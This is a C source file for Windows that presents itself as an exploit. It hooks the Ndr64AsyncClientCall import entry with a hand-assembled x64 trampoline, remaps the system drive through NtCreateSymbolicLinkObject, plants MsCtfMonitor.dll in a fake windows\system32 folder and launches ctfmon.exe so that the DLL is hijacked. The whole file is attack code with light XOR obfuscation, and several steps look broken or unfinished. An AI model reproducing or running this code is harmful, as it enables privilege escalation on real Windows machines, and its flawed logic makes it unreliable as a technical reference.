#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <dbghelp.h>

#pragma comment(lib, "Dbghelp.lib")

// Define the NtCreateSymbolicLinkObject function pointer correctly
typedef NTSTATUS (NTAPI *NtCreateSymbolicLinkObject_t)(
    PHANDLE            LinkHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PUNICODE_STRING    TargetName
);

// Trampoline with placeholders
char trampoline[] =
{
    // Save RBX
    0x48, 0xB8, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,  // mov rax,0x1111111111111111
    0x48, 0x89, 0x18,                                            // mov [rax],rbx

    // Redirect to original function
    0x5B,                                                        // pop rbx
    0x48, 0xB8, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22,  // mov rax,0x2222222222222222
    0xFF, 0xD0,                                                  // call rax
    0x53,                                                        // push rbx
    0x50,                                                        // push rax

    // Save all registers
    0x41, 0x57, // push r15
    0x41, 0x56, // push r14
    0x41, 0x55, // push r13
    0x41, 0x54, // push r12
    0x41, 0x53, // push r11
    0x41, 0x52, // push r10
    0x41, 0x51, // push r9
    0x41, 0x50, // push r8
    0x55,       // push rbp
    0x57,       // push rdi
    0x56,       // push rsi
    0x52,       // push rdx
    0x51,       // push rcx
    0x53,       // push rbx
    0x50,       // push rax

    // Execute custom code
    0x48, 0xB8, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33,  // mov rax,0x3333333333333333
    0xFF, 0xD0,                                                  // call rax

    // Restore all registers
    0x58,       // pop rax
    0x5B,       // pop rbx
    0x59,       // pop rcx
    0x5A,       // pop rdx
    0x5E,       // pop rsi
    0x5F,       // pop rdi
    0x5D,       // pop rbp
    0x41, 0x58, // pop r8
    0x41, 0x59, // pop r9
    0x41, 0x5A, // pop r10
    0x41, 0x5B, // pop r11
    0x41, 0x5C, // pop r12
    0x41, 0x5D, // pop r13
    0x41, 0x5E, // pop r14
    0x41, 0x5F, // pop r15

    // Restore RBX
    0x48, 0xB8, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44,  // mov rax,0x4444444444444444
    0x48, 0x8B, 0x18,                                            // mov rbx,[rax]
    0x58,                                                        // pop rax
    0xC3,                                                        // ret
};

// Function pointers and global variables
NtCreateSymbolicLinkObject_t NtCreateSymbolicLinkObject;
UNICODE_STRING s;
HANDLE h;

// Function to get current DOS device path
void get_current_dos_device(int size, char *current_device_path) {
    char current_directory[0x100];
    char current_volume[0x100];
    char current_dos_device[0x100];
    char final_path[0x200];

    // Getting current directory
    if (GetCurrentDirectoryA(sizeof(current_directory), current_directory) == 0) {
        fprintf(stderr, "GetCurrentDirectory failed with error: %lu\n", GetLastError());
        return;
    }

    // Getting current volume (e.g., "C:")
    strncpy_s(current_volume, sizeof(current_volume), current_directory, 2);
    current_volume[2] = '\0';

    // Getting current device
    if (QueryDosDeviceA(current_volume, current_dos_device, sizeof(current_dos_device)) == 0) {
        fprintf(stderr, "QueryDosDeviceA failed with error: %lu\n", GetLastError());
        return;
    }

    // Building final path
    strncpy_s(final_path, sizeof(final_path), current_dos_device, sizeof(final_path) - 1);
    strncat_s(final_path, sizeof(final_path), current_directory + 2, sizeof(final_path) - strlen(final_path) - 1);

    // Returning device path name
    strncpy_s(current_device_path, size, final_path, size - 1);
    current_device_path[size - 1] = '\0';
}

// Function to convert ASCII to Unicode
void ascii_to_unicode(char *ascii, wchar_t *unicode) {
    size_t len = strlen(ascii) + 1;
    for (size_t i = 0; i < len; i++) {
        unicode[i] = (wchar_t)ascii[i];
    }
}

// Function to find the IAT entry for a given function
void* find_iat_entry(const char* moduleName, const char* functionName) {
    HMODULE hModule = GetModuleHandleA(moduleName);
    if (!hModule) {
        printf("Module %s not loaded.\n", moduleName);
        return NULL;
    }

    ULONG size;
    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)ImageDirectoryEntryToData(
        hModule, TRUE, IMAGE_DIRECTORY_ENTRY_IMPORT, &size);
    if (!importDesc) {
        printf("No import directory found.\n");
        return NULL;
    }

    while (importDesc->Name) {
        const char* importModule = (const char*)((BYTE*)hModule + importDesc->Name);
        if (_stricmp(importModule, "rpcrt4.dll") == 0) { // Adjust if necessary
            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + importDesc->FirstThunk);
            while (thunk->u1.Function) {
                FARPROC* func = (FARPROC*)&thunk->u1.Function;
                FARPROC targetFunc = GetProcAddress(GetModuleHandleA("rpcrt4.dll"), functionName);
                if (*func == targetFunc) {
                    return func;
                }
                thunk++;
            }
        }
        importDesc++;
    }
    return NULL;
}

// Function to replace placeholder values in the trampoline
int replace_trampoline_value(char *shellcode, unsigned int size, unsigned __int64 original_value, unsigned __int64 value) {
    for (unsigned int pos = 0; pos < (size - sizeof(unsigned __int64)); pos += sizeof(unsigned __int64)) {
        if (*(unsigned __int64*)(shellcode + pos) == original_value) {
            *(unsigned __int64*)(shellcode + pos) = value;
            return 1; // Success
        }
    }
    return 0; // Failure
}

// Function to execute custom code
void remap_system_drive(void) {
    Sleep(1000); // Delay to wait for "ctfmon.exe" to appear

    // Initialize UNICODE_STRING for OBJECT_ATTRIBUTES
    // Assuming you want to create a symbolic link to the drive, adjust as needed
    wchar_t targetPath[] = L"\\??\\C:\\NewSymbolicLink";
    UNICODE_STRING targetName;
    RtlInitUnicodeString(&targetName, targetPath);

    // Initialize OBJECT_ATTRIBUTES
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &targetName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    h = 0;
    NTSTATUS status = NtCreateSymbolicLinkObject(&h, 0xF0001, &objAttr, &targetName);
    if (status == 0) { // STATUS_SUCCESS
        printf("[+] Symbolic Link Created: Handle: %p\n", (void*)h);
    } else {
        fprintf(stderr, "NtCreateSymbolicLinkObject failed with status: 0x%X\n", status);
    }
}

// XOR encode/decode function
void xor_encode(char* data, size_t length, char key) {
    for (size_t i = 0; i < length; ++i) {
        data[i] ^= key;
    }
}

int main() {
    char buffer[0x100];
    char current_dos_device[0x100];
    wchar_t current_dos_device_w[0x200];
    char system_directory[0x100];
    char drive_to_remap[16];
    char device_to_remap[16];
    wchar_t device_to_remap_w[16];
    void **Ndr64AsyncClientCall_IAT;
    void *Ndr64AsyncClientCall;
    void *hook;
    unsigned __int64 RBX;
    UNICODE_STRING drive;
    HANDLE event;
    DWORD oldProtect;
    int ret;

    // Resolve NtCreateSymbolicLinkObject dynamically
    NtCreateSymbolicLinkObject = (NtCreateSymbolicLinkObject_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateSymbolicLinkObject");
    if (!NtCreateSymbolicLinkObject) {
        fprintf(stderr, "Failed to resolve NtCreateSymbolicLinkObject: %lu\n", GetLastError());
        return 1;
    }

    // Create event object
    event = CreateEventA(NULL, FALSE, FALSE, "ctfmon_owned");
    if (!event) {
        fprintf(stderr, "CreateEvent failed with error: %lu\n", GetLastError());
        return 1;
    }

    // Allocate memory for the trampoline
    hook = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!hook) {
        fprintf(stderr, "VirtualAlloc failed with error: %lu\n", GetLastError());
        return 1;
    }
    memset(hook, 0, 0x1000);

    // XOR encode the trampoline
    char key = 0xAA; // Example key
    xor_encode(trampoline, sizeof(trampoline), key);

    // XOR decode before writing to executable memory
    xor_encode(trampoline, sizeof(trampoline), key);
    memcpy(hook, trampoline, sizeof(trampoline));

    // Change memory protection to PAGE_EXECUTE_READ
    if (!VirtualProtect(hook, 0x1000, PAGE_EXECUTE_READ, &oldProtect)) {
        fprintf(stderr, "VirtualProtect failed with error: %lu\n", GetLastError());
        VirtualFree(hook, 0, MEM_RELEASE);
        return 1;
    }

    // Get current DOS device pathname
    get_current_dos_device(sizeof(current_dos_device), current_dos_device);
    printf("[+] Current pathname: %s\n", current_dos_device);

    // Convert to Unicode
    ascii_to_unicode(current_dos_device, current_dos_device_w);

    // Initialize UNICODE_STRING for OBJECT_ATTRIBUTES
    // Here, 's' is being reused. Adjust if necessary.
    RtlInitUnicodeString(&s, (wchar_t*)current_dos_device_w);

    // Get system directory
    GetSystemDirectoryA(system_directory, sizeof(system_directory));

    // Get drive to remap (e.g., "C:")
    strncpy_s(drive_to_remap, sizeof(drive_to_remap), system_directory, 2);
    drive_to_remap[2] = '\0';

    // Get device to remap (e.g., "\\??\\C:")
    sprintf_s(device_to_remap, sizeof(device_to_remap), "\\??\\%s", drive_to_remap);

    // Convert to Unicode
    ascii_to_unicode(device_to_remap, device_to_remap_w);

    // Initialize UNICODE_STRING for drive
    RtlInitUnicodeString(&drive, (wchar_t*)device_to_remap_w);

    // Initialize OBJECT_ATTRIBUTES
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &drive, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // Initialize buffer (SecurityDescriptor)
    memset(buffer, 0, sizeof(buffer));
    *((unsigned __int64*)(buffer + 0x00)) = 0xc0001; // Example flags, adjust as needed

    // Execute ctfmon.exe to initialize DLLs
    ShellExecuteA(NULL, "open", "ctfmon.exe", "", NULL, SW_SHOW);

    // Get address of Ndr64AsyncClientCall
    Ndr64AsyncClientCall = GetProcAddress(GetModuleHandleA("rpcrt4.dll"), "Ndr64AsyncClientCall");
    if (!Ndr64AsyncClientCall) {
        fprintf(stderr, "Failed to get Ndr64AsyncClientCall: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] Ndr64AsyncClientCall: %p\n", Ndr64AsyncClientCall);

    // Find IAT entry in "rpcrt4.dll"
    Ndr64AsyncClientCall_IAT = (void**)find_iat_entry("rpcrt4.dll", "Ndr64AsyncClientCall");
    if (!Ndr64AsyncClientCall_IAT) {
        fprintf(stderr, "Failed to find IAT entry for Ndr64AsyncClientCall.\n");
        return 1;
    }
    printf("[+] Ndr64AsyncClientCall_IAT: %p\n", (void*)Ndr64AsyncClientCall_IAT);

    // Replace placeholders in the trampoline
    if (!replace_trampoline_value(trampoline, sizeof(trampoline), 0x1111111111111111, (unsigned __int64)&RBX)) {
        printf("Failed to replace 0x1111111111111111 in trampoline.\n");
    }
    if (!replace_trampoline_value(trampoline, sizeof(trampoline), 0x2222222222222222, (unsigned __int64)Ndr64AsyncClientCall)) {
        printf("Failed to replace 0x2222222222222222 in trampoline.\n");
    }
    if (!replace_trampoline_value(trampoline, sizeof(trampoline), 0x3333333333333333, (unsigned __int64)remap_system_drive)) {
        printf("Failed to replace 0x3333333333333333 in trampoline.\n");
    }
    if (!replace_trampoline_value(trampoline, sizeof(trampoline), 0x4444444444444444, (unsigned __int64)&RBX)) {
        printf("Failed to replace 0x4444444444444444 in trampoline.\n");
    }

    // Validate trampoline
    for (unsigned int i = 0; i < sizeof(trampoline); i += sizeof(unsigned __int64)) {
        unsigned __int64 val = *(unsigned __int64*)(trampoline + i);
        if (val == 0x1111111111111111 || val == 0x2222222222222222 ||
            val == 0x3333333333333333 || val == 0x4444444444444444) {
            printf("Placeholder 0x%llx not replaced at offset 0x%X\n", val, i);
        }
    }

    // Write trampoline to hook memory
    memcpy(hook, trampoline, sizeof(trampoline));

    // Hook the IAT entry
    if (!VirtualProtect(Ndr64AsyncClientCall_IAT, sizeof(void*), PAGE_READWRITE, &oldProtect)) {
        fprintf(stderr, "VirtualProtect failed while unprotecting IAT: %lu\n", GetLastError());
        return 1;
    }
    *Ndr64AsyncClientCall_IAT = hook;
    if (!VirtualProtect(Ndr64AsyncClientCall_IAT, sizeof(void*), oldProtect, &oldProtect)) {
        fprintf(stderr, "VirtualProtect failed while restoring IAT protection: %lu\n", GetLastError());
        return 1;
    }

    // User message
    printf("[+] Launching exploit...\n");

    // Create directories
    if (CreateDirectoryA(".\\windows", NULL) == TRUE || GetLastError() == ERROR_ALREADY_EXISTS) {
        // Create System32 subdirectory
        CreateDirectoryA(".\\windows\\system32", NULL);
    } else {
        printf("[-] Error: the exploit doesn't have permissions to create a directory\n");
        return 1;
    }

    // Copy DLL
    if (CopyFileA(".\\MsCtfMonitor.dll", ".\\windows\\system32\\MsCtfMonitor.dll", FALSE) == FALSE) {
        printf("[-] Error copying 'MsCtfMonitor.dll' to '.\\windows\\system32' (the file exists?)\n");
        return 1;
    }

    // Execute target program
    ShellExecuteA(NULL, "open", "ctfmon.exe", "/?", NULL, SW_SHOW);

    // Wait for DLL hijacking
    printf("[+] Waiting for DLL hijacked\n");
    ret = WaitForSingleObject(event, 10000);
    if (ret != WAIT_OBJECT_0) {
        printf("[-] WaitForSingleObject timed out or failed.\n");
    }

    // Close "C:" remapping handle
    CloseHandle(h);

    // Unhook the IAT entry
    if (!VirtualProtect(Ndr64AsyncClientCall_IAT, sizeof(void*), PAGE_READWRITE, &oldProtect)) {
        fprintf(stderr, "VirtualProtect failed while unprotecting IAT for unhooking: %lu\n", GetLastError());
        return 1;
    }
    *Ndr64AsyncClientCall_IAT = Ndr64AsyncClientCall;
    if (!VirtualProtect(Ndr64AsyncClientCall_IAT, sizeof(void*), oldProtect, &oldProtect)) {
        fprintf(stderr, "VirtualProtect failed while restoring IAT protection after unhooking: %lu\n", GetLastError());
        return 1;
    }

    // Final message
    printf("[+] Exploit successful!\n");
    return 0;
}
